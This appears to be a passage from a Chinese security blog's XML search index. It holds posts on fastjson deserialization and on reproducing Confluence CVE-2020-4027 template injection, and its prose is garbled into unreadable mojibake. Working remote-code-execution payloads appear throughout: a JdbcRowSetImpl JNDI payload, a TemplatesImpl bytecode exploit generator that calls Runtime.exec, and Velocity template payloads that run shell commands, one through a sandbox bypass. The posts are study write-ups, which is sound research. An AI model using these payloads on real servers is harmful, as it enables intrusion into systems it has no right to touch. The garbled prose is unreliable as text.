ÊØè‰∏™‰∫∫ÈÉΩ‰ºöÁªèÂéÜËøô‰∏™Èò∂ÊÆµÔºöÁúãËßÅ‰∏ÄÂ∫ßÂ±±ÔºåÂ∞±ÊÉ≥Áü•ÈÅìÂ±±ÂêéÈù¢ÊòØ‰ªÄ‰πà„ÄÇÊàëÂæàÊÉ≥ÂëäËØâ‰ªñÔºåÂèØËÉΩÁøªËøáÂéªÂ±±ÂêéÈù¢Ôºå‰Ω†‰ºöÂèëËßâÊ≤°Êúâ‰ªÄ‰πàÁâπÂà´„ÄÇÂõûÂ§¥ÁúãÔºå‰ºöËßâÂæóËøô‰∏ÄËæπÊõ¥Â•Ω„ÄÇ‰ΩÜÊàëÁü•ÈÅì‰ªñ‰∏ç‰ºöÂê¨Ôºå‰ª•‰ªñÁöÑÊÄßÊ†ºÔºåËá™Â∑±‰∏çËØïËøáÔºåÂèàÊÄé‰πà‰ºöÁîòÂøÉÔºü ÂèÇËÄÉhttps://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html https://github.com/depycode/fastjson-local-echo https://segmentfault.com/a/1190000040160637 https://segmentfault.com/a/1190000040188046 https://paper.seebug.org/1181/]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>ÂÜÖÂ≠òÈ©¨</tag>
        <tag>tomcat</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂ≠¶‰π†]]></title>
    <url>%2F2021%2F10%2F31%2Ffastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄfastjsonÂèçÂ∫èÂàóÂåñÔºåJAVAÂÆâÂÖ®Áªï‰∏çËøáÁöÑÂùé„ÄÇ ÂèçÂ∫èÂàóÂåñÂéüÁêÜ‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÔºåfastjsonÂèçÂ∫èÂàóÂåñÁöÑÁªìÊûúÊòØ‰∏Ä‰∏™JSONObjectÁöÑÂØπË±°Ôºå‰ΩÜÂú®Â∫èÂàóÂåñÊó∂ËÆæÁΩÆSerializerFeature‰∏∫WriteClassNameÔºåÂ∫èÂàóÂåñÁöÑÂ≠óÁ¨¶‰∏≤Â∞±‰ºöÂ§ö‰∏Ä‰∏™@typeÁöÑÈîÆÂÄºÂØπÔºåÂú®ÂèçÂ∫èÂàóÂåñÊó∂Â∞±‰ºöÊåâÁÖß@typeÁöÑÂÄºÔºåËøîÂõûÁõ∏Â∫îÁöÑÂØπË±°„ÄÇ ÂÆûÈ™å‰ª£Á†ÅÂíåËøêË°åÁªìÊûúÂ¶Ç‰∏ãÔºåÂèØ‰ª•ÁúãÂà∞ÂΩìÂèçÂ∫èÂàóÂåñÁöÑÊñπÊ≥ï‰∏∫parseÂíåparseObject‰∏î‰º†ÂÖ•ÂèÇÊï∞‰∏∫jsonÂ≠óÁ¨¶‰∏≤ÂíåClassÂÆû‰æãÊó∂Ôºå‰ºöËá™Âä®Ë∞ÉÁî®ÁªôÂÆöÁ±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ïÂíåsetterÊñπÊ≥ïÔºõÂΩìÊîæÂ∫èÂàóÂåñÊñπÊ≥ï‰∏∫parseObject‰∏îÂè™‰º†ÂÖ•jsonÂ≠óÁ¨¶‰∏≤Êó∂Ôºå‰ºöË∞ÉÁî®ÁªôÂÆöÁ±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ï„ÄÅsetterÊñπÊ≥ïÂíåÂÖ®ÈÉ®ÁöÑgetterÊñπÊ≥ï„ÄÇ 1234567891011public static void main(String[] args)&#123; TestClass testClass = new TestClass(); String json = JSON.toJSONString(testClass, SerializerFeature.WriteClassName); System.out.println(json); System.out.println("---------------------------"); JSON.parse(json); System.out.println("---------------------------"); JSON.parseObject(json); System.out.println("---------------------------"); JSON.parseObject(json,TestClass.class);&#125; Áªº‰∏äÔºåÊûÑÈÄ†payloadÁöÑÂÖ•Âè£Á±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ï„ÄÅsetterÊñπÊ≥ïÊàñgetterÊñπÊ≥ïÈúÄË¶ÅÂÖ∑ÊúâÂÆûÁé∞ÊÉ≥Ë¶ÅÂäüËÉΩÁöÑ‰ª£Á†ÅÔºåÊàñÂèØÈÄöËøáËøô‰∫õÊñπÊ≥ïË∑≥ËΩ¨Âà∞‰∏≠Èó¥Ë°îÊé•Á±ªÊàñÁõÆÁöÑÂÆûÁé∞Á±ª„ÄÇ POCÂàÜÊûêfastjsonÂú®1.2.24‰∏ãÊúâ‰∏§‰∏™ÈÄöÁî®ÁöÑpayloadÔºöJdbcRowSetImplÂíåTemplatesImpl„ÄÇ JdbcRowSetImpl‰ªé‰ª•‰∏ãpayloadÂèØ‰ª•ÁúãÂá∫ÊòØÈÄöËøáJNDIÊ≥®ÂÖ•ÂÆûÁé∞ÂëΩ‰ª§ÊâßË°åÁöÑÔºåÊê≠Â•ΩRMIÊúçÂä°ÂêéÔºåÂú®RuntimeÁöÑexecÊñπÊ≥ï‰∏ã‰∏™Êñ≠ÁÇπ„ÄÇ 1&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:8888/Calc&quot;,&quot;autoCommit&quot;:true&#125; Ë∞ÉÁî®Ê†àÂæàÁÆÄÂçïÔºåÂú®setAutoCommitÊñπÊ≥ïË∞ÉÁî®connnetÊñπÊ≥ïÔºåËÄåconnnetÊñπÊ≥ïÂèà‰ΩøÁî®Êàë‰ª¨ËÆæÁΩÆÁöÑJNDIÂ≠óÁ¨¶‰∏≤Ë∞ÉÁî®lookupÊñπÊ≥ïÔºåÂä†ËΩΩÊÅ∂ÊÑèÁöÑÂ∑•ÂéÇÁ±ªÂØºËá¥ÂëΩ‰ª§ÊâßË°å„ÄÇÂΩìÁÑ∂‰πüÂõ†‰∏∫ÊòØJNDIÁöÑÂà©Áî®ÊñπÂºèÔºåÂú®‰∏Ä‰∫õ‰ΩéÁâàÊú¨JDKÁéØÂ¢É‰∏ãÊâçËÉΩÂà©Áî®ÊàêÂäü„ÄÇ TemplatesImplTemplatesImplÁöÑPOCÊûÑÈÄ†ÊØîJdbcRowSetImplÂ§çÊùÇ‰∫õÔºåËÄå‰∏îÂØπÂèçÂ∫èÂàóÂåñÁöÑSerializerFeatureÂèÇÊï∞ÊúâË¶ÅÊ±ÇÔºå‰ΩøÁî®parseObjectÊó∂ÈúÄË¶ÅJSON.parseObject(json, Object.class, Feature.SupportNonPublicField)ÔºåparseÊñπÊ≥ïÊó∂ÈúÄË¶ÅJSON.parse(json,Feature.SupportNonPublicField)Ôºå‰ΩÜÂ•ΩÂ§ÑÂ∞±ÊòØÊó†ÈúÄÂá∫ÁΩëÂä†ËΩΩÊÅ∂ÊÑèÁ±ª„ÄÇ ‰∏ãÈù¢ÊòØÂà©Áî®‰ª£Á†ÅÔºåÂêåÊ†∑Âú®execÊñπÊ≥ï‰∏ãÊñ≠ÁÇπÁªßÁª≠Ë∞ÉËØï„ÄÇ 1234567891011121314151617181920public class Templates &#123; public static void main(String args[]) throws Exception &#123; ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.get(evil.class.getName()); String code = "java.lang.Runtime.getRuntime().exec(\"calc\");"; ctClass.makeClassInitializer().insertBefore(code); String randomClassName = "p1ay2win" + System.nanoTime(); ctClass.setName(randomClassName); ctClass.setSuperclass((classPool.get(AbstractTranslet.class.getName()))); byte[] evilCode = ctClass.toBytecode(); String encode = Base64.encodeBase64String(evilCode); String json = "&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"" + encode + "\"], \"_name\": \"p1ya2win\", \"_tfactory\": &#123; &#125;, \"_outputProperties\":&#123; &#125;&#125;"; System.out.println(json); JSON.parseObject(json, Object.class, Feature.SupportNonPublicField); &#125; public static class evil &#123; &#125;&#125; Ë∞ÉÁî®Ê†àÊòæÁ§∫ËÆæÁΩÆoutputPropertiesËÄåË∞ÉÁî®ÂÆÉÁöÑsetterÊñπÊ≥ïÔºåÊé•ÁùÄÂÜçÈôÜÁª≠Ë∞ÉÁî®newTransformerÊñπÊ≥ïÂíågetTransletInstanceÊñπÊ≥ï„ÄÇ‰∏ªË¶ÅÁöÑ‰ª£Á†ÅÂú®getTransletInstanceÊñπÊ≥ï‰∏≠ÔºåÂÆû‰æãÂåñ_classÊï∞ÁªÑÈáåÁõ∏Â∫îÁöÑClassÂÆû‰æã„ÄÇËÄå_classÊï∞ÁªÑÊàë‰ª¨ÊòØÊ≤°ÊúâÂú®json‰∏≠ËÆæÁΩÆÁöÑÔºåÂÆÉÁöÑËµãÂÄºÊòØÂú®‰∏äÈù¢ÁöÑdefineTransletClassesÊñπÊ≥ï„ÄÇ Ë∑üËøõdefineTransletClassesÊñπÊ≥ïÔºå‰ºöÈÄöËøáTransletClassLoaderÁöÑdefineClassÂ∞ÜÊàë‰º†ÂÖ•ÁöÑ_bytecodesÂ≠óËäÇËΩ¨Êç¢‰∏∫ClassÂÆû‰æãÔºå‰ΩÜÂú®Ëøô‰πãÂâçÂíå‰πãÂêé‰ºöË∞ÉÁî®_tfactoryÁöÑÊñπÊ≥ïÂíåÂà§Êñ≠_transletIndexÊòØÂê¶Â∞è‰∫é0„ÄÇËøôÊó∂ÂèØ‰ª•Âà©Áî®fastjsonËá™Âä®ÂÆû‰æãÂåñ‰º†Á©∫ÂÄºÁöÑÂ±ûÊÄßÁöÑÁ±ªÂûãÁöÑÁâπÊÄßÔºåÂ∞Ü_tfactoryÂàùÂßãÂåñÔºåÁÑ∂Âêé_transletIndexÁöÑÈóÆÈ¢òÔºåÂèØ‰ª•‰ª§ÊÅ∂ÊÑèÁ±ªÁöÑÁà∂Á±ª‰∏∫com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplÂú®ifÈáåÁªô_transletIndexËµãÂÄº„ÄÇËøòÊúâ‰∏™_nameÂ±ûÊÄßÔºåÂú®getTransletInstanceÊñπÊ≥ïÈáåÂà§Êñ≠‰∏∫Á©∫Âàô‰ºöËøîÂõûÁ©∫Ôºå‰∏ç‰ºöËøõÂÖ•Âà∞ÂÆû‰æãÂåñÁöÑÊñπÊ≥ïÈáåÔºåÂú®ËøôÈáåÁªô_nameÂ±ûÊÄßËµã‰ªªÊÑèÂ≠óÁ¨¶‰∏≤ÂÄºÂç≥ÂèØ„ÄÇ ËøòÊúâ‰∏™ÈóÆÈ¢òÂ∞±ÊòØÔºåpayloadÈáå_bytecodesÁöÑÂÄº‰∏∫Êï∞ÁªÑÂ•ó‰∏™base64ÁöÑÂ≠óÁ¨¶‰∏≤Ôºå‰ΩÜÂú®TemplatesImplÈáå_bytecodesÁöÑÁ±ªÂûãÊòØ‰∫åÁª¥Êï∞ÁªÑÂ≠óËäÇ„ÄÇÈÄöËøáÂà´ÁöÑÊñáÁ´†ÂæóÁü•fastjsonÊòØ‰ΩøÁî®Ëá™Â∑±ÁöÑIOUtilsÂ∑•ÂÖ∑Á±ªÂÆûÁé∞base64Ëß£Á†ÅÁöÑÔºåÂú®Áõ∏Â∫îÁöÑÊñπÊ≥ï‰∏ãÊñ≠ÁÇπ„ÄÇObjectArrayCodecÁöÑdeserialzeÊñπÊ≥ïË∞ÉÁî®JSONScannerÁöÑbytesVAluesÊñπÊ≥ïËøõË°åbase64Ëß£Á†Å„ÄÇ ÂÜçÂæÄ‰∏äÂá†Â±ÇË∑üËøõÂà∞DefaultFieldDeserializerÁöÑparseFieldÊñπÊ≥ïÔºåÊ†πÊçÆ‰∏çÂêåÁöÑfieldValueDeserilizerÂÄºÈÄöËøádeserialzeÂèçÂ∫èÂàóÂåñËé∑ÂèñÂ±ûÊÄßÁöÑÂÄº„ÄÇËÄåfieldValueDeserilizerÁöÑÂÄºÂèàÊòØ‰ªéParserConfigÁöÑgetDeserializerÊñπÊ≥ïËé∑ÂèñÔºåÂú®Ëøô‰∏™ÊñπÊ≥ïÈáåÔºåÊï∞ÁªÑÁ±ªÂûãÁöÑÂ±ûÊÄß‰ºöËøîÂõûObjectArrayCodecÂÆû‰æãÁöÑderializer„ÄÇObjectArrayCodec‰ºöÂÉèË∞ÉÁî®Ê†àÊâÄÁ§∫ÈÇ£Ê†∑ÔºåÂØπÊï∞ÁªÑÁ±ªÂûãÂ±ûÊÄßÁöÑbase64ÂÄºËß£Á†ÅËøòÂéü„ÄÇ Â±ûÊÄßÁöÑÈóÆÈ¢òÊòé‰∫Ü‰∫ÜÔºåÂõûÂà∞TemplatesImplÁöÑgetTransletInstanceÊñπÊ≥ïÔºåÂÆû‰æãÂåñ_classClassÂÆû‰æãÊï∞ÁªÑÈáåÁöÑÁ±ªÔºåÊâßË°åÁ±ªÊÅ∂ÊÑèÁ±ªÈáåÁöÑÈùôÊÄÅÊñπÊ≥ïÔºåËá≥Ê≠§Âà©Áî®ÁªìÊùü„ÄÇ ÂêéËÆ∞Âπ≥Â∫∏Ëøô‰∏úË•øÁäπÂ¶ÇÁôΩË°¨Ë°£‰∏äÁöÑÊ±°ÁóïÔºå‰∏ÄÊó¶Êüì‰∏ä‰æøÊ∞∏ËøúÊ¥ó‰∏çÊéâÔºåÊó†ÂèØÊåΩÂõû ÂèÇËÄÉhttps://y4er.com/post/fastjson-learn/ https://www.cnblogs.com/chengez/p/14789477.html https://www.cnblogs.com/0x7e/p/14400933.html https://paper.seebug.org/1242/#commonscollections-2]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>ÂèçÂ∫èÂàóÂåñ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ConfluenceÊ®°ÊùøÊ≥®ÂÖ•ÔºàCVE-2020-4027ÔºâÂ§çÁé∞]]></title>
    <url>%2F2021%2F10%2F20%2FConfluence%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-4027%EF%BC%89%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂâçÊÆµÊó∂Èó¥ÔºåÊ∂õÂì•ÂÆâÊéí‰∫Ü‰∏™ConfluenceÁ´ôÁÇπÁöÑÊµãËØïÔºåÁΩë‰∏äÊêú‰∫Ü‰∏ãÂ≠òÂú®Ê®°ÊùøÊ≥®ÂÖ•ÂèØÂØºËá¥ÂëΩ‰ª§ÊâßË°åÔºåÁºñÂè∑CVE-2020-4027„ÄÇÁΩë‰∏äÊ≤°ÊúâÂ§çÁé∞ÁöÑÊñáÁ´†ÔºåÁõ¥Âà∞Ë¶Å‰∫§Êä•Âëä‰∫ÜËøòÊòØÊ≤°ÊàêÂäüÊâßË°åÂëΩ‰ª§ÔºåÂè™ËÉΩ‰∫§‰∏™Ê®°ÊùøÊ≥®ÂÖ•ÂØºËá¥Êñá‰ª∂ËØªÂèñÊÇªÊÇªËÄåÂΩí„ÄÇËøô‰ª∂‰∫ãÂ¶ÇÈ≤†Âú®ÂñâÔºå‰∫éÊòØÊäΩÁ©∫Êê≠‰∏™ÁéØÂ¢ÉÂ§çÁé∞‰∫Ü‰∏ã„ÄÇ ÂâçÊúüÂáÜÂ§áÂ§çÁé∞ÁéØÂ¢ÉÊú¨Êñá‰ΩøÁî®ÁöÑÊòØConfluence 7.4.4ÁöÑÁâàÊú¨ÔºåÂÆòÁΩëÊúâÈÉ®ÁΩ≤ÂåÖÂèØ‰∏ãÔºåËÄÉËôëÂà∞Ë¶Å‰∏ãÊñ≠ÁÇπË∞ÉËØïÔºåÊ≤°Êúâ‰ΩøÁî®DockerÈÉ®ÁΩ≤ÔºåÊï∞ÊçÆÂ∫ìÂèØ‰ª•‰ΩøÁî®DockerËµ∑‰∏Ä‰∏™postgresÔºåÈÖçÁΩÆÊ≠•È™§ÁΩë‰∏äÊúâÂæàÂ§öÊïôÁ®ãÔºåÊú¨ÊñáÂ∞±‰∏çÂÖ∑Âèô„ÄÇ ÂâçÊúüÂáÜÂ§á‰∏ªË¶ÅÊòØIDEAÊÄé‰πàÂéªË∞ÉËØïÁöÑÈóÆÈ¢ò„ÄÇÂºÄÂ§¥Â∞±ÈÅáÂà∞ÂùëÔºåXloggcÁöÑÊó•ÂøóÊñá‰ª∂‰∏çÊîØÊåÅ‰∏≠ÊñáÔºåÁéØÂ¢ÉÁõ¥Êé•ÈÉΩÂêØÂä®‰∏çËµ∑Êù•ÔºåÊúÄÂêéÊéíÊü•‰∏ãÂú®service.batÈáåÊúâXloggcÊñá‰ª∂ÂêçÂèÇÊï∞ÔºåÁ≥ªÁªüÊòØ‰∏≠ÊñáÁöÑÊñá‰ª∂Âêç‰πü‰ºöÊòØ‰∏≠ÊñáÔºåÂà†Èô§ÊéâÁôæÂàÜÂè∑ÁöÑÂÜÖÂÆπÂç≥ÂèØ„ÄÇÈÉ®ÁΩ≤ÂåÖËá™Â∏¶‰∏Ä‰∏™tomcatÔºåÂåÖÈáåÁöÑconfluenceÁõÆÂΩïÊòØÈ°πÁõÆÁöÑWebÁõÆÂΩïÔºåÂàöÂºÄÂßãÊÉ≥ÁùÄ‰ªéIDEAÈáåÂêØÂä®tomcatÔºå‰ΩÜ‰∏çËøáÊòØËá™Â∏¶ÁöÑtomcatÔºåËøòÊòØËá™Â∑±ÁöÑtomcatÂêØÂä®ÂêéËÆøÈóÆÈÉΩÊòØ404„ÄÇÊúÄÂêéÂ≠¶ÁùÄËøúÁ®ãË∞ÉËØïÁöÑÊñπÊ≥ïÔºåÂú®Ëá™Â∏¶tomcatÁöÑcatalina.batËÑöÊú¨ÂºÄÂ§¥Âä†ÂÖ•‰ª•‰∏ã‰∏ÄË°åË∞ÉËØïÂëΩ‰ª§ÔºåÊé•ÁùÄËøêË°åÂêØÂä®Êñá‰ª∂start-confluence.batÔºåÂπ∂ÂºÄÂêØË∞ÉËØïÂç≥ÂèØ„ÄÇ Â§çÁé∞Ê≠•È™§ËôΩÁÑ∂ÁΩë‰∏äÊ≤°ÊúâÊâæÂà∞ÂÖ∑‰ΩìÁöÑÊºèÊ¥ûÁÇπÔºå‰ΩÜÊ†πÊçÆCVEÁöÑÊèèËø∞Âíå@Xiao_CÂ∏àÂÇÖÁöÑÂ§çÁé∞Êà™ÂõæÂèØÂæóÁü•ÊºèÊ¥ûÁÇπÊòØÂá∫Âú®Áî®Êà∑ÂÆè(User macros)ÈáåÔºåÂÜçÊü•ÈòÖ‰∏ãÊñáÊ°£ÂíåÊ†πÊçÆ‰∏ä‰∏Ä‰∏™Ê®°ÊùøÊ≥®ÂÖ•ÊºèÊ¥ûCVE-2019-3396ÂèØÁü•ÔºåÁî®Êà∑ÂÆèÂèØÈÄöËøáÁÆ°ÁêÜÂëòÁöÑ‰∏ÄËà¨ËÆæÁΩÆÁöÑÁî®Êà∑ÂÆèÂ§ÑËÆæÁΩÆÔºåÁÑ∂ÂêéÂú®ÁºñËæëÊñáÁ´†ÁöÑÂÖ∂‰ªñÂÆèÈáåÈ¢ÑËßàËß¶Âèë„ÄÇ Áî®CVE-2019-3396ÁöÑpayloadÂ¶Ç‰∏ãÔºåËØï‰∫Ü‰∏ãÊó†Ê≥ïÊâßË°åÂëΩ‰ª§Áõ¥Êé•ËæìÂá∫‰∫ÜÊ®°ÊùøÁöÑÂÜÖÂÆπÔºåÊ†πÊçÆCVEÁöÑÊèèËø∞ÂæóÁü•ÊòØÂõ†‰∏∫‰ΩøÁî®‰∫ÜÊ≤ôÁÆ±ÂØºËá¥ÁöÑ„ÄÇ 123456789#set($e=&quot;exp&quot;)#set($a=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))#set($input=$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))#set($sc=$e.getClass().forName(&quot;java.util.Scanner&quot;))#set($constructor=$sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))#set($scan=$constructor.newInstance($input).useDelimiter(&quot;\\A&quot;))#if($scan.hasNext()) $scan.next()#end ÈÇ£‰πàÂÖàÊù•Áúã‰∏Ä‰∏™ÁÆÄÂçïÁöÑvelocity demoÂ¶Ç‰∏ãÔºåÊúÄÂü∫Êú¨ÁöÑ‰ºöÂÆû‰æãÂåñÊ®°ÊùøÂºïÊìéVelocityEngineÂíåÊ®°Êùø‰∏ä‰∏ãÊñáVelocityContext„ÄÇ 123456789101112public static void main(String[] args) throws Exception &#123; Properties p = new Properties(); VelocityEngine velocity = new VelocityEngine(); velocity.init(p); Template template = velocity.getTemplate("test.vm", "utf-8"); VelocityContext context = new VelocityContext(); StringWriter writer = new StringWriter(); template.merge(context, writer); writer.flush(); System.out.println(writer.toString());&#125; Ë∞ÉËØïÂèØ‰ª•ÂÖà‰ªéVelocityEngineÁöÑinitÊñπÊ≥ï‰∏ãÊâã„ÄÇÂú®init‰∏ãÊñ≠ÁÇπÔºåÁÑ∂ÂêéÈáçÊñ∞ËøêË°åÁΩëÁ´ôÁöÑÂêØÂä®ËÑöÊú¨ÔºåÁî®‰∫éÂàùÂßãÂåñÁöÑPropertiesÂØπË±°ÊúâÂæàÂ§öÁöÑÈÖçÁΩÆÔºåÂÖ∂‰∏≠runtime.introspector.uberspectÊòØ‰∏éÊ≤ôÁÆ±Áõ∏ÂÖ≥ÁöÑ‰∏Ä‰∏™ÈÖçÁΩÆ„ÄÇÂÖ∂‰ΩøÁî®ConfluenceAnnotationBoxingUberspectÁ±ªËøõË°åÈÖçÁΩÆ„ÄÇ Ë∑üËøõConfluenceAnnotationBoxingUberspectÔºåÊúÄÁªàÊâæÂà∞ÂÆÉÁöÑÁà∂Á±ªSecureUberspectorÔºåÊòØVolecityÁöÑÈªòËÆ§Ê≤ôÁÆ±„ÄÇ Áî®ÂâçÈù¢ÁöÑDemoÂä†‰∏äruntime.introspector.uberspectÂ±ûÊÄßÔºå‰ΩøÁî®‰πãÂâçÊ®°ÊùøÊ≥®ÂÖ•ÁöÑpayloadËøõË°åÊµãËØïÔºå‰ºöÊäõÂá∫‰∏ÄÂè•ÂëäË≠¶„ÄÇ ÊêúÂØª‰∏ÄÁï™ÔºåÂèëÁé∞ÊòØÂú®SecureIntrospectorImplÁöÑgetMethodÊñπÊ≥ïËæìÂá∫ÁöÑÊó•Âøó„ÄÇË∑üËøõÂà∞Âêå‰∏Ä‰∏™Á±ª‰∏≠ÁöÑcheckObjectExecutePermissionÊñπÊ≥ïÔºåÈ™åËØÅÂØπË±°ÊòØÂê¶ÂêàÊ≥ï„ÄÇÂ∏∏ËßÑÊ®°ÊùøÊ≥®ÂÖ•Ëé∑ÂèñClassÂÆû‰æãÔºå‰∏ÄËà¨ÈÄöËøáStringÁ±ªÂûãÁöÑClassÂÆû‰æãË∞ÉÁî®forNameÊñπÊ≥ïÔºå‰πüÂ∞±ÊòØjava.lang.ClassÂ∑≤ÁªèÂú®ÈªëÂêçÂçïÁ±ªÂÜÖÔºåÊâÄ‰ª•ËøôÁßçÊñπÂºèÂú®ËøôÈáåÂ∞±Êó†Ê≥ï‰ΩøÁî®‰∫Ü„ÄÇ ÂÜçÂõûÂéªÁúãÁúãCVEÁöÑÊèèËø∞ÔºåËØ¥ÊòØÈÄöËøá‰∏ä‰∏ãÊñáÁªïËøáÊ≤ôÁÆ±„ÄÇÊé•‰∏ãÊù•ÊâæÊâæÊúâÂì™‰∫õ‰∏ä‰∏ãÊñáÂ±ûÊÄßÔºåÊàëËøôÈáåÂú®Ê®°Êùø‰∏≠ÊâßË°åStringÁöÑcodePointBeforeÊñπÊ≥ïÂπ∂‰∏ãÊñ≠ÁÇπ„ÄÇÈ°∫ÁùÄË∞ÉÁî®Ê†àÂæÄ‰∏äÊâæÔºåÂú®GenericVelocityMacroÁöÑexecuteÊñπÊ≥ïÈáåË∞ÉÁî®‰∫ÜMacroUtilsÁöÑdefaultVelocityContextÊñπÊ≥ï„ÄÇ Ë∑üËøõdefaultVelocityContextÊñπÊ≥ïÂèØ‰ª•ÁúãÂà∞ÈªòËÆ§ËÆæÁΩÆ‰∫Üreq„ÄÅres„ÄÅactionÂíåwebworkÂõõ‰∏™‰∏ä‰∏ãÊñáÂ±ûÊÄß„ÄÇ 123456789101112public static Context createDefaultVelocityContext() &#123; Context ctx = ConfluenceVelocityManager.getConfluenceVelocityContext(); HttpContext httpContext = new StaticHttpContext(); HttpServletRequest request = httpContext.getRequest(); HttpServletResponse response = httpContext.getResponse(); ctx.put("req", request != null ? request : new ConfluenceMockServletRequest()); ctx.put("res", response); Action action = getConfluenceActionSupport(); ctx.put("action", action); ctx.put("webwork", new VelocityWebWorkUtil(new WebWorkVelocityContext((OgnlValueStack)null), (OgnlValueStack)null, (HttpServletRequest)null, (HttpServletResponse)null)); return ctx;&#125; ÂÖ∂‰∏≠reqÂÅöÊúÄÁªàÊòØÂÆûÁé∞ServletRequestÊé•Âè£ÁöÑÔºåÂÖ∑ÊúâgetServletContextÊñπÊ≥ïÔºåÂèØËé∑ÂæóServletÁöÑ‰∏ä‰∏ãÊñá„ÄÇËÄå‰∏ä‰∏ãÊñá‰∏≠ÊúâattributesÂ±ûÊÄßÔºåÂÖ∂‰∏≠ÂåÖÊã¨org.apache.tomcat.InstanceManagerÁöÑÈîÆÂÄºÂØπÔºåËøô‰∏™Á±ªÂêçÂú®Struts2ÁöÑPoc‰∏≠ÁúãËøáÔºåÂèØ‰ª•ÈÄöËøánewInstanceÊñπÊ≥ïnew‰∏Ä‰∏™ÁªôÂÆöÁ±ªÂêçÁöÑÂÆû‰æã„ÄÇ ÁÑ∂ÂêéÂèØ‰ª•ÈÄöËøáScriptEngineManagerÊàñÂêÑÁßçË°®ËææÂºèËØ≠Ë®ÄÊâßË°åÂëΩ‰ª§„ÄÇÂÖ∂ÂÆûËøô‰∏™Ê®°ÊùøÊ≥®ÂÖ•Êú¨Ë¥®‰∏äÊòØÊºèÊ¥û‰ΩúËÄÖ@pwntesterÁöÑÂè¶‰∏Ä‰∏™CVEÊºèÊ¥ûRemote Code Execution in Apache VelocityÔºåËÄå‰∏î‰ΩúËÄÖ‰πüÁªôÂá∫‰∫ÜPOCÂ¶Ç‰∏ã„ÄÇ 1$&#123;req.getServletContext().getAttribute(&apos;org.apache.tomcat.InstanceManager&apos;).newInstance(&apos;javax.script.ScriptEngineManager&apos;).getEngineByName(&apos;js&apos;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;touch /tmp/pwned&apos;)&quot;)&#125; Âú®Ëøô‰πãÂâçÈÅáÂà∞Â§ßÂùë‰∫ÜÔºåÂÆòÊñπËØ¥ÂèóÂΩ±ÂìçÁâàÊú¨ÂåÖÊã¨7.5.0ÔºåÊàëËá™Â∑±Êê≠‰∫Ü‰∏™7.5.0ÁâàÊú¨ÔºåÂåÖÊã¨‰ΩøÁî®ÊµãËØïÁ´ôÁÇπÔºåÁî®‰∏äÈù¢ÁöÑpayloadÊòØ‰ºöÁõ¥Êé•ÂéüÊ†∑ËæìÂá∫ÁöÑÔºå‰πüÂ∞±ÊòØË¢´Ê≤ôÁÆ±Êã¶Êà™‰∫Ü„ÄÇËøô‰∏ÄÂ∫¶ËÆ©Êàë‰ª•‰∏∫ÊñπÂêëÈîô‰∫ÜÔºåÂêéÊù•Êç¢‰∏™7.4.4ÁâàÊú¨Â∞±ÊàêÂäü‰∫ÜÔºåËøôÂ∞±ÂæàÊó†ËØ≠‰∫Ü„ÄÇ ÂêéËÆ∞Ê∞¥ËøôÁØáÊñáÁ´†ÁöÑÊó∂Èó¥Ë∑®Â∫¶Â•ΩÂ§ßÔºå‰ªé‰πùÊúàÂ∫ïÂà∞Áé∞Âú∫ÔºåËøá‰∫Ü‰∏™ÂõΩÂ∫Ü‰∫∫ÈÉΩÊáàÊÄ†‰∫Ü„ÄÇÊÑüËßâÂÜôÂæóÊúâÁÇπ‰π±ÔºåÊñá‰∏≠Ëã•ÊúâÈîôËØØÁöÑÂú∞ÊñπÔºåÊúõÂêÑ‰ΩçÂ∏àÂÇÖ‰∏çÂêùÊñßÊ≠£„ÄÇ ÂèÇËÄÉhttps://securitylab.github.com/advisories/GHSL-2020-045-atlassian_confluence/ https://securitylab.github.com/advisories/GHSL-2020-048-apache-velocity/ https://twitter.com/XiaoC75068775/status/1309673425984610306 https://www.cnblogs.com/jinshiyill/p/5240906.html]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>Ê®°ÊùøÊ≥®ÂÖ•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaÂÜÖÂ≠òÈ©¨ÂèäÂÖ∂Êú∫Âà∂Â≠¶‰π†]]></title>
    <url>%2F2021%2F09%2F27%2FJava%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8A%E5%85%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%2F</url>
